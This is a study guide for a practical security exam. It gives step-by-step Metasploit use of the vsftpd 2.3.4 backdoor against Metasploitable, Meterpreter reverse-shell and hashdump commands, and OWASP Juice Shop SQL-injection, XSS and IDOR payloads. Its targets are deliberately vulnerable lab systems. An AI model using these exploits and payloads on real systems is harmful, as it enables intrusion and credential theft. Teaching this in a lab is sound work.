Exam strategy — how to pick your 2 questions

You do not need to be perfect at everything. You need two solid questions. Use this plan.

1

Read all 3 questions first (2 minutes)

Do not start typing immediately. Read every question once. You are looking for the two that match what you practised — Metasploit and Juice Shop are your strongest topics, so prefer those.

2

Attempt your strongest question first

Start with the topic you can do almost from memory. Finishing one full question early removes pressure and gives you confidence for the second one.

3

Divide your time — and set a "move on" limit

Split the total time roughly in half for your two questions. If one step is stuck for more than 10–15 minutes (a command fails, a page won't load), write down what you tried, move to the next part, and come back later if time remains. A half-finished second question earns more than one perfect question and one blank.

4

Show your working at every stage

In practical tests, marks often come from visible steps and results. Keep your terminal open, do not clear the screen, and if the question asks for proof, take the screenshot / copy the output exactly as instructed before closing anything.

5

If something fails, check the boring things first

Most practical failures are simple: wrong IP address, target machine not started, Docker container not running, or a typo. Before panicking, check: Is the target on? Did I ping it? Did I set RHOSTS correctly? Is the website open at the right port?

Topic 1

Metasploit on Ubuntu

What is it, in one line? Metasploit is a free tool that contains thousands of ready-made attacks (called exploits). You pick an exploit, tell it the target computer's IP address, and run it. If the target is vulnerable, you get access to it.

search→ use→ show options→ set→ exploit

Memorise this 5-word flow. Almost every Metasploit question follows it.

Part A — Install and start Metasploit

On many lab machines Metasploit is already installed. Try starting it first (step 3). Only install if the start command says "command not found".

1

Install with the official Rapid7 installer (only if needed)

Metasploit is not in Ubuntu's normal app store (apt install metasploit-framework will say "package not found" — that package is for Kali Linux). On Ubuntu, use the free official installer from Rapid7, the company that makes Metasploit. Open a terminal and run these one by one:

Terminal — Ubuntu
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

The first line downloads the installer and saves it as a file called msfinstall. The second line makes it runnable. The third line runs it — type your Ubuntu password when asked (the screen shows nothing while you type — that is normal). Installation takes a few minutes.

2

Start the database (do this once)

Metasploit uses a small database to remember scan results. Start it with:

Terminal — Ubuntu
sudo msfdb init
sudo msfdb status

If msfdb status shows the database is running / connected, you are ready. If your lab uses Kali-style setup and this command is missing, skip it — msfconsole still works for the test.

3

Start Metasploit

Terminal — Ubuntu
sudo msfconsole

Wait a few seconds. You will see a banner and the prompt will change to msf6 >. That prompt means you are now inside Metasploit. All commands from here are typed at this prompt — not in the normal terminal.

💡 Easy check

Type version at the msf6 > prompt. If it prints the Metasploit version, everything is working. Type exit any time to leave Metasploit and return to the normal terminal.

Part B — The core workflow (the heart of the question)

1

search — find an exploit

Search by the name of the software or service on the target. Example — searching for VSFTPD exploits:

msf6 prompt
search vsftpd

A list appears. Each line has a number, a module name (like exploit/unix/ftp/vsftpd_234_backdoor), and a rank. Excellent and Great ranks are the most reliable.

2

use — select the exploit

Select it by its number from the list, or by its full name. Using the number is faster:

msf6 prompt
use 0
# or, by full name:
use exploit/unix/ftp/vsftpd_234_backdoor

The prompt changes to show the module name, e.g. msf6 exploit(unix/ftp/vsftpd_234_backdoor) >. That confirms your selection.

3

show options — see what you must fill in

msf6 prompt
show options

A table appears. Look at the Required = yes rows with an empty Current Setting. The most common one is RHOSTS — the target's IP address. RPORT (target port) is usually already filled in correctly.

4

set — fill in the options

msf6 prompt
set RHOSTS 192.168.1.105
set RPORT 21

Replace 192.168.1.105 with your target machine's real IP (see the worked example below for how to find it). After each set, Metasploit confirms: RHOSTS => 192.168.1.105. Run show options once more to double-check before running.

5

exploit — run the attack

msf6 prompt
exploit
# "run" does exactly the same thing:
run

Watch the output. Success usually looks like "Command shell session 1 opened" or "Meterpreter session 1 opened". If it says the target is not vulnerable or the connection failed, check the IP and try check (explained below) — do not just keep pressing exploit.

Part C — Key commands to remember

CommandWhat it does
helpShows all commands. Use it if you forget anything.
search <name>Finds exploits / modules matching a name, e.g. search smb.
use <number or name>Selects a module from the search results.
infoFull description of the selected module — what it attacks and who wrote it.
show optionsLists settings you must fill in (RHOSTS, RPORT, etc.).
set <option> <value>Sets one option, e.g. set RHOSTS 192.168.1.105.
set PAYLOAD <name>Chooses what runs after the exploit works (needed for Meterpreter — see Part E).
show payloadsLists payloads that work with the selected exploit.
checkTests if the target looks vulnerable — without fully exploiting it.
exploit / runRuns the attack.
backLeaves the current module and returns to the main msf6 > prompt.
sessionsLists your open connections (sessions) to targets you have exploited.
sessions -i 1Re-enters session number 1.
exitCloses Metasploit completely.

Words you will see in options: RHOSTS = remote host = the target. RPORT = target's port. LHOST = local host = your Ubuntu machine's IP (needed for some payloads). LPORT = the port on your machine that listens for the connection back.

Part D — Full worked example: VSFTPD backdoor vs Metasploitable

This is the most common lab practical: the target is Metasploitable 2, a machine made deliberately vulnerable for learning. It runs an old FTP server, vsftpd 2.3.4, which contains a hidden backdoor. Follow it exactly.

1

Start both machines and find the target's IP

Start your Ubuntu (attacker) and Metasploitable (target) machines. On Metasploitable, log in (default username and password are both msfadmin) and type ifconfig. Note the IP — for example 192.168.1.105. Your IP will be different — always use your own.

2

Confirm the target is reachable and scan it (in Ubuntu terminal)

Terminal — Ubuntu
ping -c 3 192.168.1.105
nmap -sV 192.168.1.105

ping should get replies — if not, the machines are not on the same network; fix that first. In the nmap result, look for port 21 showing vsftpd 2.3.4. That line is your proof the target has the vulnerable service.

3

Open Metasploit and search

Terminal → msf6 prompt
sudo msfconsole
search vsftpd
4

Select the backdoor exploit and view its options

msf6 prompt
use exploit/unix/ftp/vsftpd_234_backdoor
show options

You will see RHOSTS is required and empty, and RPORT is already 21.

5

Set the target and run

msf6 prompt
set RHOSTS 192.168.1.105
exploit

Success looks like this:

Expected output
[*] Banner: 220 (vsFTPd 2.3.4)
[*] USER: 331 Please specify the password.
[+] Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened
6

Prove you are inside the target

You now have a shell on the target as root (the highest user). Run these to prove it — examiners love this output:

Inside the target shell
whoami
hostname
ifconfig

whoami should answer root, and ifconfig should show the target's IP, not yours. Press Ctrl + C and answer y to close the session when you are done.

💡 If exploit fails, run this checklist

1) ping the target again. 2) Re-run show options — is RHOSTS exactly right, no extra spaces? 3) Was the nmap result really vsftpd 2.3.4? A different version will not work with this exploit. 4) Try check to see Metasploit's own verdict.

Part E — Meterpreter basics (after a successful exploit)

Some exploits give you a plain shell — the VSFTPD example above does exactly that, and that is fine. Others give you Meterpreter — a smarter, more powerful session with its own commands. You get Meterpreter when you select a Meterpreter payload before running the exploit. Important: the payload must match the target's system — a Linux target (like Metasploitable) needs a linux/… payload; a windows/… payload only works on a Windows target and will simply fail on Linux. For the Metasploitable target, for example:

msf6 prompt — before running exploit
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.100
show options

Here LHOST is your Ubuntu IP (find it with ifconfig in a second terminal) — the target connects back to you, which is why it is called reverse. Once you see "Meterpreter session 1 opened" and the prompt becomes meterpreter >, use these commands:

Meterpreter commandWhat it does
sysinfoTarget's computer name, operating system, and architecture.
getuidWhich user you are running as on the target.
ipconfigTarget's network details (same idea as ifconfig).
psLists programs currently running on the target.
pwd / lsShows your current folder / lists files in it.
download <file>Copies a file from the target to your machine.
upload <file>Copies a file from your machine to the target.
hashdumpDumps the target's password hashes (Windows targets; needs admin rights).
screenshotTakes a screenshot of the target's desktop.
shellDrops you into the target's normal command shell. Type exit to return to Meterpreter.
backgroundPauses this session and returns to msf6 > — the session stays alive. Bring it back with sessions -i 1.
exitCloses the Meterpreter session completely.

The one idea to remember: a normal shell gives you the target's own basic commands. Meterpreter gives you extra ready-made commands (sysinfo, hashdump, download) that the target's own shell does not have.

Topic 2

OWASP Juice Shop

What is it, in one line? Juice Shop is a fake online juice shop that OWASP built deliberately full of security holes. Your job is to find and exploit those holes — each one you solve is called a challenge, and the site keeps your score.

Part A — Set it up with Docker and open it

1

Check Docker is installed

Terminal — Ubuntu
docker --version

If a version number appears, Docker is ready. If not, install it with sudo apt install docker.io -y, then start it: sudo systemctl start docker.

2

Download and run Juice Shop (one command)

Terminal — Ubuntu
sudo docker pull bkimminich/juice-shop
sudo docker run --rm -p 3000:3000 bkimminich/juice-shop

The first command downloads the shop (only needed once). The second starts it. -p 3000:3000 means "show the shop on port 3000 of this computer". When you see a message like "Server listening on port 3000", it is running. Leave this terminal open — closing it stops the shop.

3

Open the shop in your browser

Type in browser address bar
http://localhost:3000

You should see the juice shop homepage with products like Apple Juice. Dismiss the welcome banner and cookie notice (click Dismiss / Me want it!) so they stop covering the screen.

💡 Useful Docker commands

See what is running: sudo docker ps · Stop everything: press Ctrl + C in the terminal where Juice Shop runs (because of --rm it cleans itself up) · Start again any time with the same docker run command. Your challenge progress is stored in the browser, so solved challenges stay solved on the same browser.

Part B — Find the hidden Score Board

The Score Board page lists every challenge and ticks them off as you solve them. It is hidden on purpose — finding it is itself the first challenge ("Score Board").

1

Just change the address

The simplest reliable method: edit the address in your browser to:

Type in browser address bar
http://localhost:3000/#/score-board
2

Confirm it worked

The Score Board opens, a success notification appears ("Score Board" challenge solved), and you can now see all challenges grouped by difficulty — 1-star challenges are the easiest. Keep this page open in a second tab during the test: after each challenge, refresh it to confirm your tick appeared.

How would you find it without knowing the address? The route name is hidden in the site's own code — press F12 (Developer Tools), search the page source for "score", and the path appears. You only need the direct address for the test, but knowing this explains why it works if the examiner asks.

Challenge 1 — SQL Injection: log in as the admin without the password

The idea: the login box builds a database query using whatever you type. If you type a special piece of SQL code instead of an email, you can trick the query into letting you in as the first user in the database — who is the administrator.

1

Go to the Login page

Click the account icon (top right) → Login.

2

Type the injection in the Email box

Copy exactly — including the apostrophe and the two dashes' OR 1=1--

In the Password box, type anything at all, e.g. test. The password does not matter.

3

Click Log in

You are logged in — as the administrator. A notification confirms the "Login Admin" challenge is solved. Check the Score Board tab to see the tick.

Why it works (say this if asked): ' closes the email text early, OR 1=1 adds a condition that is always true, and -- comments out the rest of the query — including the password check. So the database returns the first user it finds: the admin.

Common mistake

Forgetting the apostrophe at the start, or the space before --. Copy the payload character by character: ' space OR space 1=1--

Challenge 2 — XSS: make the search box pop up an alert

The idea: XSS (Cross-Site Scripting) means the website displays what you typed as code instead of as plain text. If your code runs in the browser, the challenge is solved.

1

Click the search icon

Click the magnifying glass (top right of the shop) so the search box opens.

2

Type this payload and press Enter

Copy exactly — note the backtick characters ` around xss<iframe src="javascript:alert(`xss`)">

Those are backticks (the key above Tab, next to 1) around the word xss — not normal apostrophes.

3

An alert box pops up

An alert saying xss appears on screen. That popup is the proof — the "DOM XSS" challenge is solved. Click OK and check your Score Board tick.

💡 If the first payload does not pop up

Make sure you pressed Enter so the search actually ran, and re-check the backticks. A second payload that also solves it: search for the same iframe code again after refreshing the page — Juice Shop sometimes needs the results page to fully load.

Challenge 3 — View another user's basket

The idea: every basket has a number (an ID). The shop checks who you are when you log in — but it forgets to check whose basket you are asking for. So if you change the basket number, you can see someone else's basket. This type of flaw is called IDOR / Broken Access Control.

1

Create your own account and log in

Account icon → Login → Not yet a customer? Register with any email and password, e.g. sadaf@test.com. Then log in with it.

2

Add any product to your basket

Click Add to Basket on any juice, then click the basket icon. Notice your basket opens — this is your basket, with its own ID number working behind the scenes.

3

Open Developer Tools and watch the basket request

Press F12 → click the Network tab → refresh the basket page (F5). In the list of requests, find the one named like basket/2 (the number is your basket ID — yours may be a different number). Click it and look at the Response: it shows your basket's contents as data.

4

Ask for basket number 1 directly

In a new browser tab, type this address — it asks the shop's API for basket 1, which belongs to another user (the admin):

Type in browser address bar
http://localhost:3000/rest/basket/1

Easier visual method: while on your basket page, open the browser's storage — press F12 → Application tab → Local Storage → find the bid value, change it to 1, then refresh the basket page. Your basket page now displays the other user's items.

5

Confirm on the Score Board

The "View another user's shopping basket" challenge is marked solved, and you can see items you never added. That difference — their items on your screen — is the proof the examiner wants to see.

Why it works (say this if asked): the shop trusted the basket ID sent by the browser and never checked that the basket belongs to the logged-in user. Changing the ID is enough — no password needed. The fix would be to check ownership on the server for every request.

Easy extra challenges (if a question asks for more)

  • Zero Stars: go to the Contact page and submit feedback without giving any star rating — just write text and submit.
  • Confidential Document: open http://localhost:3000/ftp — a hidden file listing — and download acquisitions.md.
  • Error Handling: visit a nonsense address like http://localhost:3000/#/search?q=test%27 style broken input, or any invalid page, to trigger a raw error page.

If Juice Shop will not open

  • Is the docker run terminal still open and showing "listening on port 3000"?
  • Run sudo docker ps — is the container listed?
  • Did you type localhost:3000 exactly, with http://?
  • Port busy? Stop the old container (sudo docker stop + container ID from docker ps) and run again.
